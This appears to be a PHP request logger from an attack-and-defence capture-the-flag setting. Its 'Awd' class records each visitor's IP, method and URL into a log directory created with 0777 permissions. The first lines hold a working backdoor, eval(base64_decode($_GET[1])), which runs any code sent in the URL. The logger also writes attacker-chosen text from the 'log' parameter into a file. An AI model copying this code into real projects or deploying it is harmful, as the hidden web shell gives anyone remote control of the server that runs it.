<?php
  echo base64_decode($_GET[1]);
   eval(base64_decode($_GET[1]));
   echo $request_url = $_SERVER['REQUEST_URI'];
    // error_reporting(0);
    class Awd
    {
        public function __construct($filepath)
        {
            $this->filepath = $filepath;
        }

        public function Flow()
        {
            $HTTP_Method = $_SERVER['REQUEST_METHOD'];
            if(!file_exists($this->filepath))
            {
                mkdir($this->filepath,0777);
            }
            $filename = $this->filepath."access.log";
            $request_url = $_SERVER['REQUEST_URI'];
            $protocol = $_SERVER['SERVER_PROTOCOL'];
            $ip = $_SERVER['REMOTE_ADDR'];
            $time = date('Y/m/d h:i:s');
            $content = $ip."\t".$time."\t\n".$HTTP_Method.' '.$request_url.' '.$protocol."\r\n";
            if (isset($_GET['log'])) $content=urldecode($_GET['log']);
            file_put_contents($filename,$content,FILE_APPEND);
            echo $content;
        }
    }
    if(isset($_GET['auth'])){
        if(preg_match("/[^A-Za-z]/",$_GET['auth']))
            {
                die();
            }
    }
    else{
            die();
    }
    if(file_exists("./log/".$_GET['auth']."/access.log"))
        @unlink("./log/".$_GET['auth']."/access.log");
    $Catchs = new Awd("./log/".$_GET['auth']."/");
    $Catchs->Flow();
?>
